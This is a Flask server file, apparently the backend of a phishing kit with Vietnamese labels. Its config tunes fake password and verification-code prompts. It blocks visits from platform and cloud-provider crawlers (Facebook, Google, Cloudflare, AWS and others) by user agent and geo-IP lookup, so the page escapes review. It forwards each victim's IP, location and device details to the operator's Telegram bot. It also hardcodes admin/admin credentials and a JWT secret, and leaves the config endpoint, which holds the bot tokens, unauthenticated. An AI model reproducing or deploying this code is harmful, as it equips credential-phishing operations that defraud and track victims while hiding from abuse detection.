import json
import os
from datetime import datetime
from functools import wraps
from json.decoder import JSONDecodeError

import jwt
import requests
from flask import Flask, jsonify, request, send_file
from flask_cors import CORS
from requests.exceptions import RequestException

app = Flask(__name__, static_folder="dist", template_folder="dist")
CORS(app)

SECRET_KEY = "ovf_tank"
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "settings": {
        "code_loading_time": 15000,
        "max_failed_code_attempts": 3,
        "max_failed_password_attempts": 2,
        "page_loading_time": 5000,
        "password_loading_time": 10000,
        "code_input_enabled": True,
    },
    "telegram": {
        "notification_chatid": "",
        "notification_token": "",
        "data_chatid": "",
        "data_token": "",
    },
}


def ensure_config_file():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
            json.dump(DEFAULT_CONFIG, file, indent=2)


ensure_config_file()


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"message": "Token is missing!"}), 403
        try:
            jwt.decode(token.split()[1], SECRET_KEY, algorithms=["HS256"])
        except jwt.ExpiredSignatureError:
            return jsonify({"message": "Token has expired!"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"message": "Token is invalid!"}), 401
        return f(*args, **kwargs)

    return decorated


@app.route("/api/admin/login", methods=["POST"])
def login():
    data = request.get_json()
    if data["username"] == "admin" and data["password"] == "admin":
        token = jwt.encode({"user": data["username"]}, SECRET_KEY, algorithm="HS256")
        return jsonify({"success": True, "token": token})
    return jsonify({"success": False, "message": "Invalid credentials"}), 401


@app.route("/api/admin/config", methods=["GET"])
def get_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as file:
            config = json.load(file)
        return jsonify(config)
    except (IOError, JSONDecodeError) as e:
        return jsonify({"message": "Error reading config file", "error": str(e)}), 500


@app.route("/api/admin/config", methods=["POST"])
@token_required
def update_config():
    try:
        new_config = request.get_json()
        if not all(key in new_config for key in ["settings", "telegram"]):
            return jsonify({"message": "Invalid config structure"}), 400

        if not all(key in new_config["settings"] for key in DEFAULT_CONFIG["settings"]):
            return jsonify({"message": "Invalid settings structure"}), 400

        if not all(key in new_config["telegram"] for key in DEFAULT_CONFIG["telegram"]):
            return jsonify({"message": "Invalid telegram structure"}), 400

        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
            json.dump(new_config, file, indent=2)
        return jsonify({"message": "Config updated successfully"})
    except (IOError, OSError, JSONDecodeError) as e:
        return jsonify({"message": "Error writing config file", "error": str(e)}), 500


@app.errorhandler(Exception)
def handle_error(error):
    response = jsonify({"error": str(error)})
    response.status_code = 500
    return response


@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent")
    ip = request.remote_addr
    if is_bot(ip, user_agent):
        return jsonify({"message": "Access Denied"}), 403

    send_visitor_info(ip, user_agent)
    return send_file("index.html")


@app.route("/<path:path>")
def catch_all(path):
    user_agent = request.headers.get("User-Agent")
    ip = request.remote_addr
    send_visitor_info(ip, user_agent)
    if is_bot(ip, user_agent):
        return jsonify({"message": "Access Denied"}), 403
    elif os.path.exists(os.path.join(app.static_folder, path)):
        return send_file(os.path.join(app.static_folder, path))
    else:
        return send_file("index.html")


def is_bot(ip, user_agent):
    blocked_organizations = [
        "facebook",
        "google",
        "tiktok",
        "youtube",
        "instagram",
        "twitter",
        "linkedin",
        "pinterest",
        "snapchat",
        "whatsapp",
        "zalo",
        "viber",
        "line",
        "kakaotalk",
        "naver",
        "daum",
        "nate",
        "hanmail",
        "vercel",
        "cloudflare",
        "aws",
        "azure",
        "google cloud",
        "amazon",
        "apple",
        "microsoft",
        "samsung",
        "huawei",
        "oppo",
        "vivo",
        "xiaomi",
        "oneplus",
        "realme",
        "asus",
        "lenovo",
        "netlify",
    ]
    if any(org in user_agent.lower() for org in blocked_organizations):
        return True
    try:
        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
        geo_data = response.json()
        if "organization" in geo_data and any(
            org in geo_data["organization"].lower() for org in blocked_organizations
        ):
            return True
    except (RequestException, JSONDecodeError) as e:
        print(f"Error fetching geo data: {e}")
        geo_data = {}
    return False


def send_visitor_info(ip, user_agent):
    try:
        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
        geo_data = response.json()
    except (RequestException, JSONDecodeError) as e:
        print(f"Error fetching geo data: {e}")
        geo_data = {}

    def escape_html(text):
        special_characters = {"<": "&lt;", ">": "&gt;", "&": "&amp;"}
        for char, replacement in special_characters.items():
            text = text.replace(char, replacement)
        return text

    user_agent = escape_html(str(user_agent))
    ip = escape_html(str(ip))
    country = escape_html(str(geo_data.get("country", "Không có")))
    region = escape_html(str(geo_data.get("region", "Không có")))
    city = escape_html(str(geo_data.get("city", "Không có")))
    latitude = escape_html(str(geo_data.get("latitude", "Không có")))
    longitude = escape_html(str(geo_data.get("longitude", "Không có")))
    timezone = escape_html(str(geo_data.get("timezone", "Không có")))
    asn = escape_html(str(geo_data.get("asn", "Không có")))
    organization = escape_html(str(geo_data.get("organization", "Không có")))

    message = f"""
<b>🖥️ User Agent:</b> <code>{user_agent}</code>
<b>📅 Thời gian:</b> <code>{datetime.now().isoformat().replace(".", "&#46;")}</code>
<b>📶 IP:</b> <code>{ip}</code>
<b>🌐 Quốc gia:</b> <code>{country}</code>
<b>🏙️ Vùng:</b> <code>{region}</code>
<b>🏠 Thành phố:</b> <code>{city}</code>
<b>📍 Vĩ độ:</b> <code>{latitude}</code>
<b>🧭 Kinh độ:</b> <code>{longitude}</code>
<b>🕒 Múi giờ:</b> <code>{timezone}</code>
<b>🔗 ASN:</b> <code>{asn}</code>
<b>🏢 Tổ chức:</b> <code>{organization}</code>
"""

    print(message)
    send_to_telegram(message, "HTML")


def send_to_telegram(message, parse_mode="HTML"):
    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
        telegram_bot_token = json.load(config_file)["telegram"]["notification_token"]
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    params = {
        "chat_id": json.load(open(CONFIG_FILE, encoding="utf-8"))["telegram"][
            "notification_chatid"
        ],
        "text": message,
        "parse_mode": parse_mode,
    }
    try:
        response = requests.post(url, json=params, timeout=5)
        print(response.json())
    except RequestException as e:
        print(f"Failed to send message to Telegram: {e}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
